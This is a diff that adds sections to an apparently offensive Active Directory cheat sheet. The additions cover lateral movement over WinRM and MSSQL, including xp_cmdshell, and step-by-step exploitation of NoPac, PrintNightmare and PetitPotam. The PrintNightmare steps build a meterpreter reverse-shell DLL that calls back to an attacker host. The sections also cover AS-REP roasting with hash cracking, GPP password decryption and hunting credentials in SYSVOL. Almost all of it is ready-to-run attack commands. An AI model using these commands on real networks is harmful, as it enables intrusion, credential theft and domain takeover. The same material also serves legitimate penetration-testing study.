@@ -310,6 +310,73 @@ lsadump::dcsync /domain:<d> /user:<DOMAIN>\administrator
 ```
 Grab **krbtgt** → Golden Ticket. **Detect/mitigate:** Event ID 4662; replication rights to DCs only; least privilege; rotate krbtgt.
 
+## Using privileged access (WinRM / RDP / MSSQL)
+Once you own a user with remote rights, log in and work:
+```powershell
+# who can remote in?
+Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Desktop Users"
+Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Management Users"
+# WinRM session
+$cred = New-Object System.Management.Automation.PSCredential('<DOM>\<u>',(ConvertTo-SecureString '<pw>' -AsPlainText -Force))
+Enter-PSSession -ComputerName <host> -Credential $cred
+```
+```bash
+evil-winrm -i <host> -u <u> -p '<pw>'                 # WinRM from Linux
+mssqlclient.py <DOM>/<u>@<host> -windows-auth          # then: enable_xp_cmdshell ; xp_cmdshell whoami
+# PowerUpSQL: Get-SQLInstanceDomain ; Get-SQLQuery -Instance <h> -Query 'SELECT @@version'
+```
+BloodHound cypher: `CanPSRemote` edge = WinRM access, `SQLAdmin` edge = MSSQL admin.
+
+## Kerberos Double-Hop problem
+WinRM/PSRemoting uses NTLM-less Kerberos, so your creds **can't forward to a second hop** (TGT not stored in the remote session). Symptom: works on DEV01, access to a third box fails. Fixes:
+- **CredSSP:** `Enable-WSManCredSSP -Role Client -DelegateComputer <srv>` (client) + `-Role Server` (server), then `Enter-PSSession ... -Authentication CredSSP`. Caveat: delegates plaintext creds (riskier).
+- Pass a `-Credential $Cred` object directly to PowerView cmdlets inside the session (works for single commands).
+- **KCD** (constrained delegation) is the secure, config-side fix.
+
+## Bleeding-edge AD CVEs (reference)
+All need a valid domain user + a vulnerable (unpatched) DC. Tools: Impacket + the named PoCs.
+- **NoPac — CVE-2021-42278 + 42287 (sAMAccountName spoofing)** → straight to DA.
+  ```bash
+  python3 scanner.py <dom>/<u>:<p> -dc-ip <DC> -use-ldap          # check
+  python3 noPac.py <dom>/<u>:<p> -dc-ip <DC> -dc-host <DCNAME> -shell --impersonate administrator -use-ldap
+  # or -dump -just-dc-user <dom>/administrator  (DCSync)
+  ```
+- **PrintNightmare — CVE-2021-34527 / 1675 (Spooler RCE → SYSTEM).**
+  ```bash
+  rpcdump.py @<DC> | egrep 'MS-RPRN|MS-PAR'     # spooler active?
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ME> LPORT=<P> -f dll > x.dll
+  sudo smbserver.py -smb2support Share /path/    # host the DLL ; set up multi/handler
+  python3 CVE-2021-1675.py <dom>/<u>:<p>@<DC> '\\<ME>\Share\x.dll'
+  ```
+- **PetitPotam — CVE-2021-36942 (coerce DC auth → relay to AD CS → DC cert → DCSync).**
+  ```bash
+  ntlmrelayx.py -smb2support --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
+  python3 PetitPotam.py <ME> <DC>              # coerce
+  # gettgtpkinit.py with the captured cert → KRB5CCNAME → secretsdump -k -no-pass
+  ```
+
+## Miscellaneous misconfigurations (quick wins)
+```powershell
+# passwords left in the description field
+Get-DomainUser * | ? {$_.Description} | select samaccountname,description
+# accounts that don't require a password
+Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol
+# creds in SYSVOL logon scripts
+ls \\<DC>\SYSVOL\<domain>\scripts ; cat \\<DC>\SYSVOL\<domain>\scripts\<script>.vbs
+# hidden DNS records
+# adidnsdump -u <dom>\<u> ldap://<DC> [-r]
+```
+- **GPP cpassword:** `Groups.xml` in SYSVOL stores an AES-encrypted local-admin password with a **public key** → trivially decrypt: `gpp-decrypt <cpassword>` or `crackmapexec smb <DC> -u <u> -p <p> -M gpp_autologin`.
+- **AS-REP Roasting** (accounts with pre-auth disabled — no creds needed to request):
+  ```bash
+  GetNPUsers.py <DOM>/ -dc-ip <DC> -no-pass -usersfile users.txt -format hashcat
+  # or Rubeus.exe asreproast /nowrap /format:hashcat
+  hashcat -m 18200 asrep.hash rockyou.txt
+  ```
+- **GPO abuse:** writable GPO → push a local admin, scheduled task, or rights to a user (tools: SharpGPOAbuse). **MS14-068:** PAC forging (patch is the only fix). **Exchange** groups (Exchange Windows Permissions) often hold DCSync-equivalent rights — PrivExchange.
+
+> Half of AD compromises come from this "misc" list, not fancy Kerberos math: a password in a description, a cpassword in SYSVOL, an AS-REP-roastable account. Always check these early — they're free.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
